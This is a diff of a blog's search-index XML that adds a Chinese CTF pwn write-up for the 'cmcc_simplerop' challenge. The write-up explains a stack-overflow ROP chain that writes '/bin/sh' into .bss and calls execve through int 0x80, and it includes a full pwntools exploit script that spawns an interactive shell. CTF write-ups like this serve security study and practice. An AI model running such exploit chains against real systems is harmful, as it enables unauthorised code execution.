@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>cmcc_simplerop</title>
+      <link href="/2022/01/24/cmcc_simplerop/"/>
+      <url>/2022/01/24/cmcc_simplerop/</url>
+      
+        <content type="html"><![CDATA[<p>系统调用+rop</p><span id="more"></span><h1 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>32位程序，开了NX，部分RELRO保护</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242148415.png" alt="image-20220124214841349"></p><p>主函数存在栈溢出</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242148568.png" alt="image-20220124214824363"></p><p>该题 没有system函数和’/bin/sh’，考虑使用int 80系统调用，地址为0x080493e1</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242159336.png" alt="image-20220124215933258"></p><p>设置系统调用int80(11,”/bin/sh”,null,null”)的参数eax,ebx,ecx,edx</p><p>找到eax，进行赋值,地址为0x080bae06</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242247809.png" alt="image-20220124224731633"></p><p>找到pop edx;pop,ecx;ret，地址为0x0806e850</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242218036.png" alt="image-20220124221830924"></p><p>接下来调用read函数，将/bin/sh写入bss段，没有开PIE，bss地址为绝对地址。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242300841.png" alt="image-20220124230033674"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node4.buuoj.cn&quot;, 29088)</span></span><br><span class="line">p = process(<span class="string">&#x27;./simplerop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_addr = <span class="number">0x0806cd50</span></span><br><span class="line">int_80 = <span class="number">0x080493e1</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">pop_edx_ecx_eax_ret = <span class="number">0x0806e850</span></span><br><span class="line">bss_addr = <span class="number">0x080eb584</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x20</span> + p32(read_addr)       <span class="comment"># 返回到read函数</span></span><br><span class="line">payload += p32(pop_edx_ecx_eax_ret)<span class="comment"># 平衡栈空间</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>)<span class="comment"># read函数的三个参数 </span></span><br><span class="line">payload += p32(pop_eax_ret) + p32(<span class="number">0xb</span>)<span class="comment"># 对eax进行赋值为11</span></span><br><span class="line"><span class="comment"># 对edx、ecx、ebx进行赋值</span></span><br><span class="line">payload += p32(pop_edx_ecx_eax_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss_addr)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>hitcontraining_unlink</title>
       <link href="/2022/01/19/hitcontraining_unlink/"/>
       <url>/2022/01/19/hitcontraining_unlink/</url>
